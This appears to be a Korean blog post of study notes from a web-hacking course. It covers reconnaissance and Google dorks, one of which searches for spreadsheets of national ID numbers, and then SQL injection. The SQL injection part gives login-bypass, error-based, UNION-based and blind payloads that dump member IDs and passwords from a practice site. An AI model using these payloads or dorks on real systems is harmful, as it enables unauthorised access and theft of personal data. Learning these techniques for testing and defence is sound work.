---
layout: post
title: "웹 어플리케이션 보안 -2"
author: "한결"
categories: blog
---


### 쿠키

* 웹 해킹 절차 : 공격대상 선정 -> 정보수집 -> 취약점 분석 -> 공격 -> 보고서
* 정보수집
  * 포트 스캔
  * 사이트 정보 수집
    * ip 확인 nslookup 도메인 이름
    * 사이트 구조 (웹서핑)
    * whois
    * netcraft.com
    * archive.org
    * 크롤링
    * 소스보기, 개발자 도구
    * 검색엔진 정보수집

* 디렉터리 리스팅 취약점 : 서버 설정 미흡

* 구글 해킹 

  구글 검색을 통해 검색되는 중요 정보들이 존재함. 보안 미흡.

  * intitle:index.of 영화
  * filetype:xlsx 주민등록번호
  * inurl:admin/member_list.jsp
  * inurl:dbconn.inc
  * https://www.exploit-db.com
  * shodan.io



* 구글해킹 대책 : 구글 사이트에 신고할 것.
  * robots.txt : 검색되지 않게하는 설정파일을 작성함. 설정파일을 무시하고 검색되게 만드는 사이트도 있음.
  * /robot_flag/
  * http://ctf.j0n9hyun.xyz:2020/



### 모의해킹 

체크리스트 기반의 취약점을 진단해본다. 전세계에서 유명한 취약점 리스트를 알아야 함.

* 국내에서 자주 사용하는 취약점 리스트
  * 국정원 8대 취약점
  * 과기부, 행안부, kisa -> 각종 취약점, 보안 관련 가이드 문서. 주요기반시설취약점 진단 가이드



### SQL 인젝션

웹 어플리케이션이 데이터베이스에 날리는 SQL을 개발자가 의도하지 않은 형태로 조작하여 공격하는 기법이다.

* Form SQL Injection (bypass SQL Injection) 로그인 SQL 인젝션

  ```
  Form SQL Injection (bypass SQL Injection)
  
  select * from member where id='사용자입력id' and pwd='사용자입력pwd'
  -> 일반적인 로그인 과정에서 SQL 쿼리문
  
  id : ' or 1=1--
  
  -- : MSSQL, ORALCD에서 사용되는 주석처리
  # : MYSQL에서 사용되는 주석처리
  ```

  ```
  select * from member where id='' or 1=1--
  -> 첫번째 조회되는 사용자의 계정으로 로그인됨.
  
  ' or ''='
  ' or '1'='1'
  ' or '1'='1
  
  ' or '2'='2
  ' or 2>1
  ' or 1=1--
  
  반복적으로 숫자를 바꿔서 시도해보며 해킹시도.
  ```

  * http://coashanee5.blogspot.com/2017/02/sql.html

  

  ```
  select * from member where (id='아이디' and pwd='패스워드');
  -> ' or 1=1)--
  
  특정 사용자로 로그인 시도
  attacker'--
  ```





* Error based SQL injection

  응답 에러메세지를 통해 정보를 획득하여 공격하는 SQL 인젝션 공격기법

  게시판 검색창을 통해 해킹.

  ```
  ' and db_name()=0-- 
  -> db 이름 알아내기
  
  ' and @@version=0-- 
  -> dbms 버전 정보 알아내기
  
  ' and @@serviocename=0-- 
  -> dbms 서비스 이름 알아내기
  ```

  * having

    ```
    ' having 1=1--
    -> 에러 발생하며 DB 테이블명이 chapter1 컬럼명은 idx 라는 정보를 알아냄
    ```

  * group by

    ```
    ' group by chapter1.idx--
    -> 정보 획득 chapter1.level_idx 
    
    ' group by chapter1.idx, chapter1.level_idx--
    -> 정보 획득 'chapter1.ref_idx' 
    
    ' group by chapter1.idx, chapter1.level_idx, chapter1.ref_idx--
    -> 정보 획득 'chapter1.title' 
    
    chapter1.idx   chapter1.level_idx   chapter1.ref_idx  chapter1.title
    
    ' group by chapter1.idx, chapter1.level_idx, chapter1.ref_idx, chapter1.title, chapter1.name, chapter1.wtday, chapter1.hitcnt--
    
    ```

    ```
    로그인창에서도 똑같이 에러정보를 통해 컬럼명을 획득할 수 있다.
    
    'group by member.m_idx,member.m_id,member.m_name --
    ```



### Union SQL Injection의 조건

Union으로 연결할 양쪽의 컬럼의 수가 같아야 한다. 같은 위치의 컬럼의 타입이 다를 경우 에러가 발생할 수 있다. 컬럼의 이름이 정확해야 한다.

```
' union select NULL,NULL,NULL,NULL,NULL,NULL,NULL from member--

' union select 1,1,1,1,1,1,1 from member--


' union select 1,1,1,m_id,m_name,NULL,NULL from member--

-> union select를 사용하여 member 테이블의 데이터를 게시판 항목으로 출력

' union select 1,1,1,m_id,m_name,NULL,NULL from member where m_id > 'b'--
```





### information_schema를 사용한 DB 정보 획득 SQL 인젝션

* MYSQL, MSSQL의 경우 information_schema 데이터 베이스에 전체 DB의 정보가 저장됨.
* information_schema.columns 테이블을 조회할 경우, 전체 DB의 테이블명, 컬럼명을 조회할 수 있음. (table_name, column_name)
* Union SQL Injection 으로 information_schema.columns의 항목을 포함시켜 DB 정보 획득 공격을 진행해보도록 한다.

```
' union select 1,1,1,table_name,column_name,NULL,NULL from information_schema.columns--
-> 테이블 명, 컬럼 명 조회

' union select 1,1,1,table_name,NULL,NULL,NULL from information_schema.columns--
-> 테이블 명만 조회
-> member 테이블 존재 확인

' union select 1,1,1,column_name,NULL,NULL,NULL from information_schema.columns where table_name='member'--
-> 멤버테이블의 컬럼명을 확인
-> 테이블명, 컬럼명이 확인이 되고 해당 정보를 바탕으로 union select를 사용하여 멤버 정보를 출력할 수 있다.

' union select 1,1,1,m_id,m_pwd,NULL,NULL from member--
```



### Blind SQL Injection

쿼리 결과(참, 거짓) 에 따라 정보를 획득하여 공격하는 기법

```
attacker' and 1=1-- 참구문
attacker' and 1=2-- 거짓구문
-> and 뒤의 조건이 참이나 거짓일 경우 결과가 다르게 나타남을 활용한다.
```

* Blind SQL Injection을 이용하여 db 이름 알아내기 실습

  ```
  substring('abcdef', 1,2);
  => abcdef 중 ab 반환 1번째부터 시작해서 2개 길이 반환
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('a')--
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('g')--
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('m')--
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),1,1)) >= ASCII('l')--
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),2,1)) >= ASCII('e')--
  
  attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS varchar(20)),3,1)) >= ASCII('e')--
  
  ```

  * db이름 : le

    문제점 : -> 노가다가 너무 심하고 시간이 너무 오래걸린다.
    해결책: 자동화된 공격 툴로 공격을 수행한다.
